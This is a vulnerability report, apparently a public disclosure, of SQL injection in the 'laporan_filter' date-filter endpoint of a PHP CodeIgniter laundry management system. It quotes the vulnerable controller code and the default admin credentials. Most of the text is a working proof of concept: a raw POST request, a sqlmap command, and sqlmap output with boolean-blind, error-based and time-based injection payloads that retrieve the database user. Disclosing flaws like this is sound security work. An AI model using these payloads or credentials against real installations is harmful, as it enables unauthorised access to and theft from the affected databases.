Laundry Management System SQL Injection on (/ci_laundry/karyawan/laporan_filter) 

Vendor Homepage:

```
https://www.sourcecodester.com/php-ci-laundry-management-system-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Crudentials:

```
admin
admin123
```

Affected Page:

```
/ci_laundry/karyawan/laporan_filter
```

In the `data_karyawan->filter($dari, $sampai)` method, `$dari` and `$sampai` are directly concatenated into the SQL query string, leading to a risk of SQL injection.

```
	public function laporan_filter()
	{
		$user['username'] = $this->session->userdata('username');

		$dari = $this->input->post('dari');
		$sampai = $this->input->post('sampai');

		$data['data_karyawan'] = $this->data_karyawan->filter($dari, $sampai)->result();

		$this->load->view('header');
		$this->load->view('navigation', $user);
		$this->load->view('laporan/laporan_karyawan', $data);
		$this->load->view('footer');
		$this->load->view('source');
	}
```

Proof of vulnerability:

Request:

```
POST /ci_laundry/karyawan/laporan_filter HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_laundry/karyawan/laporan
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; ci_session=gsb5m3cv44ehk9dfslbejs8afg77l81t
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

dari=2024-04-08&sampai=2024-04-09*
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
[14:56:25] [INFO] testing 'MySQL UNION query (62) - 81 to 100 columns'
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1211 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: dari=2024-04-08&sampai=2024-04-09') AND 5639=5639 AND ('mSXI'='mSXI

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: dari=2024-04-08&sampai=2024-04-09') AND GTID_SUBSET(CONCAT(0x717a6b6b71,(SELECT (ELT(7517=7517,1))),0x717a627871),7517) AND ('QhNv'='QhNv

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: dari=2024-04-08&sampai=2024-04-09') AND (SELECT 7008 FROM (SELECT(SLEEP(5)))TnRC) AND ('rpSN'='rpSN
---
[14:56:38] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.6
[14:56:38] [INFO] fetching current user
[14:56:38] [INFO] retrieved: 'root@localhost'
current user: 'root@localhost
```

